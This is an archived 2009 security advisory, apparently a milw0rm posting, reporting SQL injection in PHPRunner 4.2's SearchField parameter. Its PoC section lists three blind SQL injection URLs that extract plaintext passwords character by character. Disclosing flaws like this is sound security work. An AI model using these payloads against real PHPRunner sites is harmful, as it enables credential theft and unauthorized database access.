@@ -1,0 +1,56 @@
+##########################www.BugReport.ir########################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title:        PHPRunner SQL Injection
+# Vendor:        http://www.xlinesoft.com
+# Vulnerable Version:    4.2 (prior versions also may be affected)
+# Exploitation:        Remote with browser
+# Original Advisory:    http://www.bugreport.ir/index_63.htm
+# Fix:            N/A
+###################################################################################
+
+####################
+- Description:
+####################
+
+PHPRunner builds visually appealing web interface for popular databases. Your web site visitors will be able to easily search, add, edit, delete and exprt
+
+data in MySQL, Oracle, SQL Server, MS Access, and Postgre databases.
+
+####################
+- Vulnerability:
+####################
+
+Input passed to the "SearchField" parameters in "UserView_list.php" is not properly sanitised before being used in SQL queries.
+This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+
+Vulnerable Pages: 'orders_list.php' , 'users_list.php' , 'Administrator_list.php'
+
+
+####################
+- PoC:
+####################
+
+Its possible to obtain plain text passwords from database by blind fishing exploit
+
+http://example.com/output/UserView_list.php?a=search&value=1&SearchFor=abc&SearchOption=Contains&SearchField=Password like '%%')--
+http://example.com/output/UserView_list.php?a=search&value=1&SearchFor=abc&SearchOption=Contains&SearchField=mid(Password,1,1)='a')--
+http://example.com/output/UserView_list.php?a=search&value=1&SearchFor=abc&SearchOption=Contains&SearchField=mid(Password,1,2)='ab')--
+
+####################
+- Solution:
+####################
+
+Edit the source code to ensure that inputs are properly sanitized.
+
+
+####################
+- Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com 
+
+# milw0rm.com [2009-03-17]
